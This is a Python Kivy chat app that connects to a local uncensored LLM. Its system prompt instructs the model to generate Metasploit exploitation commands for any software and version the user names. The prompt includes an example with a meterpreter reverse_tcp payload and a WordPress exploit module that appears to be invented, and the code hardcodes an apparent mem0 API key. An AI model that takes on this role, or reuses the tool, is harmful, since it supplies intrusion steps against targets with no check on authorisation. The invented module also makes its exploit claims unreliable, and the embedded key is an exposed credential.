import requests
import json
from mem0 import MemoryClient
import io
from pydub import AudioSegment
from pydub.playback import play
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.image import Image
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.behaviors import ButtonBehavior
from kivy.graphics import Color, Rectangle
from kivy.clock import Clock
import pyperclip

class KeygenButton(ButtonBehavior, Label):
    def __init__(self, **kwargs):
        super(KeygenButton, self).__init__(**kwargs)
        self.font_size = 16
        self.size_hint = (None, None)
        self.size = (120, 40)
        self.bold = True
        self.background_color = (0, 0, 0, 1)

    def on_press(self):
        self.color = (1, 0, 0, 1)

    def on_release(self):
        self.color = (1, 1, 1, 1)

class MSFChatApp(App):
    def build(self):
        # Main layout
        self.user_id = "default_user"
        self.user_context = {}
        self.client = MemoryClient(api_key="m0-ltqgD0YwadthcfiM53LdQTabwf7rYvTBOHHPwyIc")

        self.layout = BoxLayout(orientation='vertical')

        # Adjusted Header Image
        header = Image(source='header.png', size_hint=(1, 0.3))  # Make it smaller (adjust 0.3 as needed)
        self.layout.add_widget(header)

        # Chat Interface with ScrollView
        self.chat_content = GridLayout(cols=1, size_hint_y=None, padding=10, spacing=5)
        self.chat_content.bind(minimum_height=self.chat_content.setter('height'))
        self.chat_window = ScrollView(size_hint=(1, 0.3))  # Allocate more space for chat output
        self.chat_window.add_widget(self.chat_content)
        self.layout.add_widget(self.chat_window)

        # Example of adding a Label for AI output
        msg = Label(
            text="", # Assistant: Enter your MSF target and details related to version or additional elements of your target
            size_hint=(None, None),
            width=600,  # Adjust this value to control the width of the text box
            height=100,  # Adjust for height
            halign='left',  # Align text to the left
            valign='middle',
            text_size=(600, None),  # Ensure the text wraps within the specified width
        )
        msg.bind(texture_size=msg.setter('size'))
        self.chat_content.add_widget(msg)



        # Input and Button Bar
        input_box = BoxLayout(orientation='horizontal', size_hint=(1, 0.2))
        self.user_input = TextInput(size_hint=(0.7, 1), multiline=False)
        input_box.add_widget(self.user_input)

        
        send_button = KeygenButton(text='SEND')
        send_button.bind(on_release=self.on_send)
        clear_button = KeygenButton(text='CLEAR')
        clear_button.bind(on_release=self.on_clear)

        copy_button = KeygenButton(text='COPY')
        copy_button.bind(on_release=self.copy_last_ai_message)

        input_box.add_widget(send_button)
        input_box.add_widget(clear_button)
        input_box.add_widget(copy_button)

        self.layout.add_widget(input_box)

        return self.layout

    def on_send(self, instance):
        prompt = self.user_input.text
        if prompt.strip():
            self.append_message("User", prompt)
            self.generate(self.user_id, prompt)
            self.user_input.text = ""

    def on_clear(self, instance):
        self.user_input.text = ""

    def append_message(self, role, message):
        label = Label(text=f"{role}: {message}", size_hint_y=None, height=40)
        self.chat_content.add_widget(label)
        self.chat_window.scroll_to(label)

    def play_audio_from_stream(self, output_text):
        audio_data = self.get_tts_stream(output_text)
        if audio_data:
            audio = AudioSegment.from_file(io.BytesIO(audio_data), format="wav")
            play(audio)
        else:
            print("Failed to get the TTS stream.")

    def get_tts_stream(self, output_text):
        base_url = "http://localhost:8020/tts_stream"
        params = {
            "text": output_text,
            "speaker_wav": "calm_female",
            "language": "en"
        }
        try:
            response = requests.get(base_url, params=params, stream=True)
            response.raise_for_status()
            return response.content
        except requests.RequestException as e:
            print(f"Error during TTS request: {e}")
            return None


    def copy_last_ai_message(self, instance):
        # Find the last AI message in the chat content and copy it
        last_ai_message = None
        for widget in reversed(self.chat_content.children):
            if widget.text.startswith("AI:"):
                last_ai_message = widget.text
                break

        if last_ai_message:
            pyperclip.copy(last_ai_message.replace("AI: ", ""))
            print("Copied AI message:", last_ai_message)

    def generate(self, user_id, prompt):
        context = self.user_context.get(user_id, "")
        context += f" User: {prompt}\n"
        user_input = context
        user_message = {"role": "user", "content": user_input}
        self.client.add([user_message], user_id="ollama")

        api_url = "http://localhost:11434/api/chat"
        headers = {"Content-Type": "application/json"}
        payload = {
            "model": "dolphin-llama3:latest",
            "messages": [
                {"role": "system", "content": """You are an AI assistant trained to generate Metasploit commands for vulnerability exploitation. Your task is to analyze the provided target information and use your knowledge of Metasploit to suggest potential exploit modules and commands that can be used against the target. 

Instructions:
1. Identify the target software and its version (e.g., WordPress 5.2.4).
2. Based on the version information, determine possible vulnerabilities that could be exploited.
3. Provide specific Metasploit commands to set up and execute the exploit.

Target Information:
- Software: {software_name}
- Version: {software_version}

Analyze the information and generate a Metasploit command example for exploitation:
- List relevant Metasploit modules and explain what each does.
- Provide the steps to execute the command, including setting the payload and other options.

Example:
Input: 
Software: WordPress
Version: 5.2.4

Output:
1. Vulnerability Analysis:
- Detected vulnerability: Unauthenticated Remote Code Execution (RCE) exploit in WordPress 5.2.4 due to a flaw in XYZ plugin.
- Exploit module: `exploit/unix/webapp/wp_5_2_4_rce`

2. Metasploit Commands:
- `use exploit/unix/webapp/wp_5_2_4_rce`
- `set RHOSTS <target IP>`
- `set RPORT 80`
- `set TARGETURI /wp-admin`
- `set PAYLOAD php/meterpreter/reverse_tcp`
- `set LHOST <your IP>`
- `set LPORT 4444`
- `exploit`

Note: The above steps are based on known vulnerabilities in WordPress 5.2.4. Always confirm the availability of an exploit module and adapt commands accordingly."

Follow this format and output accurate information based on the input."""},
                {"role": "user", "content": context}
            ]
        }
        try:
            response = requests.post(api_url, json=payload, headers=headers)
            response.raise_for_status()
            lines = response.text.strip().split('\n')
            combined_response = ""
            for line in lines:
                try:
                    data = json.loads(line)
                    if 'message' in data and 'content' in data['message']:
                        combined_response += data['message']['content']
                except json.JSONDecodeError:
                    continue

            context += f" AI: {combined_response.strip()}\n"
            self.user_context[user_id] = context

            ai_output = combined_response.strip()
            self.append_message("AI", ai_output)
            self.play_audio_from_stream(ai_output)

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    user_id = "default_user"
    MSFChatApp().run()
